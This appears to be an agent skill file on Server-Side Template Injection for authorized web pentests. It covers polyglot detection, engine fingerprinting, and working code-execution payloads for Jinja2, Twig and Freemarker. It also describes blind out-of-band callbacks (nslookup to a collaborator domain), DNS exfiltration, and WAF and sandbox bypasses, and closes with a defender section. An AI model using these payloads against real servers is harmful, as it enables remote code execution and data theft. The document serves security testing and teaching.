---
name: ssti
description: Use when testing a web application for Server-Side Template
  Injection on an authorized engagement. Covers polyglot detection probes
  that distinguish template engines, fingerprinting Jinja2, Twig,
  Freemarker, Velocity, Smarty, ERB and others, escalating from reflected
  math to object traversal and remote code execution, and exploiting blind
  SSTI out-of-band. Use when user input is reflected inside pages, emails,
  PDFs, error messages, or profile fields and simple math expressions like
  7*7 evaluate server side.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-sqli, web-xss, webapp-pentest-methodology]
tools:
  - name: Python
    version: "3.12"
  - name: Burp Suite
    version: "2026.2"
---

Server-Side Template Injection happens when user input is embedded in a
template that the server renders, so template syntax in the input gets
executed. This skill covers the full authorized methodology: detecting
injection with polyglots, identifying the engine, escalating to code
execution per engine, and handling blind cases. All testing targets
systems you have written permission to test.

## Quick Workflow

1. Find every input whose value is reflected in rendered output: profile
   fields, names, comments, ticket subjects, email bodies, PDF content.
2. Inject the detection polyglot and read which parts evaluate.
3. Identify the template engine from the syntax that evaluated and from
   error messages.
4. Move from math evaluation to reading engine objects and attributes.
5. Escalate to arbitrary code or command execution using the engine's
   documented gadget chains.
6. For blind SSTI (no reflection), prove execution out-of-band with DNS
   or HTTP callbacks.
7. Stop at a harmless proof (whoami, id, a marker file read) per the
   rules of engagement.
8. Record the payload, engine, and output for the report.

## 1. Detection with polyglots

Start with inputs that render back to you. Inject expressions from
several syntax families at once and see which one computes.

```bash
# Master detection polyglot: covers {{ }}, ${ }, #{ }, <%= %>, *{ }
curl -s -X POST 'https://target.example/profile' \
  -b 'session=VICTIMSESSION' \
  --data-urlencode 'name=${7*7}{{7*7}}#{7*7}<%= 7*7 %>*{7*7}' \
  | grep -o '.\{0,40\}49.\{0,20\}' | head -5
```

```bash
# Simpler staged approach when the polyglot is too noisy.
# Stage 1: plain math should come back unchanged if nothing evaluates.
curl -s 'https://target.example/greet?name=7*7'

# Stage 2: try each syntax family separately
for p in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '*{7*7}'; do
  echo "--- payload: $p"
  curl -s --get 'https://target.example/greet' --data-urlencode "name=$p" \
    | grep -o 'Hello[^<]*' | head -1
done
```

If `{{7*7}}` renders as `49`, you have template evaluation. If it renders
literally, that engine is not in play (or output encoding neutralized
it, so also test in contexts like emails and error pages).

Confirm code context versus plaintext context:

```bash
# In code context, closing the statement may be needed:
# try }} first, then check if raw template code leaks in errors
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name={{7*7}}' | grep -i -E 'error|exception|trace' | head -3
```

## 2. Engine fingerprinting

Different engines, different probes. Use these to pin the engine before
building an exploit.

```bash
# Jinja2 / Twig style {{ }}: string concat and filters
# {{'a'~'b'}} -> 'ab' means Twig; {{'a'+'b'}} or config access means Jinja2
curl -s --get 'https://target.example/greet' \
  --data-urlencode "name={{'a'~'b'}}"

# Freemarker ${ }: built-ins
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name=${"a"?upper_case}'

# Velocity #set / #foreach
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name=#set($x=7*7)$x'

# ERB <%= %>: Ruby
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name=<%= 7*7 %>'

# Smarty { }: PHP
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name={7*7}'
```

Error messages are gold: a Python traceback points at Jinja2 or Tornado,
a Java stack trace at Freemarker or Velocity, Ruby traces at ERB. Save
every error page; the engine name often appears in the first lines.

Reference table (probe, engine, language):

- `{{7*7}}` then `{{config}}`: Jinja2 (Python).
- `{{7*7}}` then `{{'a'~'b'}}`: Twig (PHP).
- `${7*7}`: Freemarker or Velocity (Java), or Thymeleaf `[[${7*7}]]`.
- `#{7*7}`: Pug/Jade (Node) or Freemarker string interpolation.
- `<%= 7*7 %>`: ERB (Ruby) or EJS (Node).
- `*{7*7}`: Spring expression language (Java).

## 3. Jinja2 exploitation (Python)

Jinja2 is the most common SSTI target. Walk from object access to code
execution step by step.

```bash
# Step 1: confirm object graph access
curl -s --get 'https://target.example/greet' \
  --data-urlencode "name={{''.__class__}}" | grep -o 'class[^<]*' | head -1

# Step 2: reach object subclasses
# {{''.__class__.__mro__[1].__subclasses__()}} lists every loaded class
```

Once subclasses are reachable, the classic chain finds a class that
gives process access. The well-known gadget (use only on authorized
targets):

```
{{''.__class__.__mro__[1].__subclasses__()[X]...}}
```

Rather than memorizing an index (it shifts between Python builds),
enumerate programmatically through the injection point with a small
script that pages through subclasses looking for useful ones
(`warnings.catch_warnings`, `subprocess.Popen`, file loaders). Or use
the shorter lipsum/config routes when available:

```bash
# If config is exposed, secrets may sit in it directly
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name={{config}}'

# lipsum is a classic exposed global in Flask debug contexts
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name={{lipsum.__globals__}}'
```

```python
#!/usr/bin/env python3
"""Find a usable gadget class index through a Jinja2 SSTI point."""
import urllib.request, urllib.parse, re

BASE = "https://target.example/greet"
def render(payload):
    url = BASE + "?" + urllib.parse.urlencode({"name": payload})
    return urllib.request.urlopen(url, timeout=15).read().decode(errors="replace")

# Dump a slice of subclasses and search for interesting names
out = render("{{''.__class__.__mro__[1].__subclasses__()}}")
for i, m in enumerate(re.finditer(r"class '([\w.]+)'", out)):
    name = m.group(1)
    if any(k in name for k in ("Popen", "catch_warnings", "file", "BuiltinImporter")):
        print(i, name)
```

Keep command output small (for example `id` or `whoami`) so the response
stays readable, and URL-encode the whole payload.

## 4. Twig, Freemarker, and Velocity exploitation

Twig (PHP):

```bash
# Confirm Twig string concatenation
curl -s --get 'https://target.example/greet' --data-urlencode "name={{'a'~'b'}}"
# Classic Twig RCE via the _self / env globals (authorized targets only):
# {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Freemarker (Java):

```bash
# Confirm built-ins evaluate
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name=${"abc"?upper_case}'
# Freemarker RCE via ?new (authorized targets only):
# <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

Velocity (Java):

```bash
# Confirm directive evaluation
curl -s --get 'https://target.example/greet' \
  --data-urlencode 'name=#set($x="a")$x'
```

Each engine has published sandbox escapes; match the payload to the exact
engine version you fingerprinted, because sandboxes change between
releases. When a sandbox blocks attribute access, try the engine's own
introspection helpers (Twig's `_self`, Freemarker's `?api`) before exotic
bypasses.

## 5. Blind SSTI

When the template renders but the output never shows your input (stored
templates rendered into emails, PDFs, or logs), go out-of-band.

```bash
# Jinja2 blind: make the server resolve a unique collaborator subdomain
# {{''.__class__.__mro__[1].__subclasses__()}} is too noisy blind;
# instead use a URL fetch if the sandbox permits, else DNS:
# {{ config.__class__.__init__.__globals__['os'].popen('nslookup YOURID.oastify.com').read() }}
```

Simpler blind confirmation first, using time:

```bash
# Freemarker/Java blind timing (authorized targets only):
# <#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
# Measure the response time with curl -w '%{time_total}'
curl -s -o /dev/null -w '%{time_total}\n' --get 'https://target.example/greet' \
  --data-urlencode 'name=<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("sleep 5")}'
```

If timing confirms execution, switch to DNS exfiltration for data: embed
the data in a subdomain the target resolves, and read it in the
collaborator log. Keep exfiltrated data minimal (a hostname, a username),
per the engagement rules.

## 6. SSTI in emails, PDFs, and filenames

Templates hide in places beyond web pages:

- Password-reset and notification emails often render `{{name}}`.
- PDF generators (invoice templates) evaluate expressions server side.
- Exported filenames and CSV headers sometimes pass through a template.
- Error pages that echo the bad input (`/nonexistent-{{7*7}}`).

Test each by registering the polyglot as your display name or input
value, then triggering the render (request a reset email, generate the
PDF, visit the error page). The injection point and the render point are
often different requests, so track both.

```bash
# Set the display name to the polyglot, then trigger a render
curl -s -X POST 'https://target.example/profile' -b 'session=ATTACKERSESSION' \
  --data-urlencode 'display_name=${7*7}{{7*7}}' -o /dev/null
curl -s 'https://target.example/invoice.pdf' -b 'session=ATTACKERSESSION' \
  -o /tmp/invoice.pdf
pdftotext /tmp/invoice.pdf - 2>/dev/null | grep -E '49|\$\{|\{\{' | head -3
```

## Edge cases

- The application HTML-encodes your payload on reflection. Encoding
  happens after template rendering in broken apps, so SSTI still works;
  in correct apps the payload renders literally and there is no bug.
  Test in non-HTML contexts (emails, PDFs) where encoding may differ.
- WAF strips `{{` and `}}`. Try alternate syntaxes for the same engine
  (`{% %}` blocks, string interpolation `#{}`), or split the payload
  across two parameters that get concatenated before rendering.
- The template is rendered twice (double evaluation): your output gets
  re-rendered, which can break payloads or, rarely, double-execute.
  Detect by injecting `{{'{{7*7}}'}}` and watching for `49`.
- Sandboxed Jinja2 (SandboxedEnvironment) blocks `__class__` and
  friends. Published bypasses exist per version; fingerprint the exact
  Jinja2 version from error pages before trying them.
- Input length limits truncate payloads. Build the shortest chain that
  works, or split logic across multiple injections if the template
  concatenates fields.
- The injection lands inside a template comment or string literal. Break
  out first (`}}` then your code, or close the quote), mirroring how
  you would escape any code context.

## Escalation

- No reflection anywhere: treat it as blind from the start and use
  timing plus DNS callbacks for every step.
- Object traversal blocked: look for exposed globals the developers
  left in scope (`config`, `request`, `lipsum`, `cycler`, `joiner` in
  Flask/Jinja2) that skip the sandbox.
- `os` and `subprocess` unreachable: read files instead of running
  commands (template file readers, `open()` via reachable classes);
  a local file read still proves server-side execution.
- RCE achieved but egress filtered: the DNS callback may fail while
  HTTP works, or vice versa; test both channels, and fall back to
  writing output into a rendered field you can read (profile bio,
  order notes).
- Engine misidentified: go back to the error messages. A single real
  stack trace beats ten guessed payloads.

## Detection and defender view

Defenders see SSTI as template syntax (`{{`, `${`, `#{`, `<%`) arriving
in user input, followed by error pages leaking engine internals or by
outbound DNS/HTTP callbacks from the server. Application logs may show
the raw payload in the input that was rendered. The durable fix is to
never render user input as a template: keep user data as variables,
never as template source. If user-influenced templates are unavoidable,
use logic-less templates (Mustache-style) or a hardened sandbox, run
rendering with least privilege, and strip template syntax from input on
the way in. Monitor for template error stack traces in production logs;
they are both an information leak and evidence of active probing.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the injection
  point.
- MITRE ATT&CK T1059 (Command and Scripting Interpreter): post-exploit
  command execution.
- CWE-1336 (Improper Neutralization of Special Elements Used in a
  Template Engine): SSTI.
- CWE-94 (Improper Control of Generation of Code, Code Injection).
- OWASP Testing Guide: Testing for Server-Side Template Injection.
- PortSwigger Web Security Academy: SSTI labs, engine decision tree,
  and cheat sheet.
- Jinja2 documentation: SandboxedEnvironment and API reference.

## See also

- `ctf-web-challenges-ssti-challenges`: Use it instead for the competition version, framed around reaching a flag through template injection.
